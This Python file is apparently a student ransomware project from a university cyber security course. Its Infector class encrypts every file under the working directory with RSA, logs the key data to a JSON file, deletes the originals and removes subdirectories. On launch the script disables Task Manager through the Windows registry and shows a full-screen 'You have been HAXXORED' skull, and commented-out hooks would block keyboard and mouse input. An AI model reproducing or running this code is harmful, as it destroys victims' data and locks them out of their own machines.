import shutil
import os, var, json, base64
import pythoncom, pyHook 
from RSAMain import RSAEncryption
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, hashes, hmac, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from tkinter import *
from winreg import *

'''
 You got totally
 ~ HAXXX0RD ~
 by:
 Brian Powell @BriianPowell
 Mina Messiha @MinaMessiha109
 CECS 378 - Cyber Security
 Aliasgari
'''

class Infector:
    def encryptDir(self):
        currentDir = os.getcwd()
        
        # Fetch a list of all files within the root directory
        for root, dirs, files in os.walk(currentDir):
            for file in files:
                if file not in var.EXCLUSIONS:
                    # Encrypting each files in the list of files
                    # For file in filesList:
                    RSACipher, CT, IV, TAG, EXT = RSAEncryption().encryptRSA(root, os.path.join(root, file))
                    rsa2ascii = base64.encodebytes(RSACipher).decode('ascii')
                    ct2ascii = base64.encodebytes(CT).decode('ascii')
                    iv2ascii = base64.encodebytes(IV).decode('ascii')
                    tag2ascii = base64.encodebytes(TAG).decode('ascii')
                    
                    jData = json.dumps({'RSACipher': rsa2ascii, 'CT': ct2ascii, 'IV': iv2ascii, 'TAG': tag2ascii, 'EXT': EXT})

                    # Writing encryption data to JSON file
                    with open(os.path.join(root, 'ripLul.json'), 'a') as jFile:    
                        jFile.write(jData)
                    os.remove(os.path.join(root,file))
                    
            for dir in dirs:
                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)


def main():
    Infector().encryptDir()

# if __name__ == '__main__':
#     main()

root = Tk()
root.title('Infector')
root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))
# root.overrideredirect(True)
# root.config(cursor="none")
root.configure(background='black')
skull = Label(root, text=" @@@@@                                        @@@@@\n@@@@@@@                                      @@@@@@@\n@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@\n@@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@\n@@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@\n@@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@\n@@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@\n@@@@@@@    @@@@@@    @@@@@@\n@@@@@@      @@@@      @@@@@\n@@@@@@      @@@@      @@@@@\n@@@@@@    @@@@@@    @@@@@\n@@@@@@@@@@@  @@@@@@@@@@\n@@@@@@@@@@  @@@@@@@@@\n@@   @@@@@@@@@@@@@@@@@   @@\n@@@@  @@@@ @ @ @ @ @@@@  @@@@\n@@@@@   @@@ @ @ @ @ @@@   @@@@@\n@@@@@      @@@@@@@@@@@@@      @@@@@\n@@@@          @@@@@@@@@@@          @@@@\n@@@@@              @@@@@@@              @@@@@\n@@@@@@@                                 @@@@@@@\n@@@@@                                   @@@@@\nYou have been HAXXORED")
skull.config(font=("fixedsys", 17))
skull.config(background="black")
hackingGreen = "#%02x%02x%02x" % (102, 255, 0)
skull.config(foreground="#66FF00")
skull.grid(column=0, row=0)
root.columnconfigure(0, weight=1)
root.rowconfigure(0, weight=1)

keyVal = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
try:
    key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
except:
    key = CreateKey(HKEY_CURRENT_USER, keyVal)
SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 1)    

# [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
# "DisableTaskMgr"=dword:00000001

# def uMad(event):
#     return False

# hm = pyHook.HookManager()
# hm.MouseAll = uMad
# hm.KeyAll = uMad
# hm.HookMouse()
# hm.HookKeyboard()
#pythoncom.PumpMessages()

mainloop()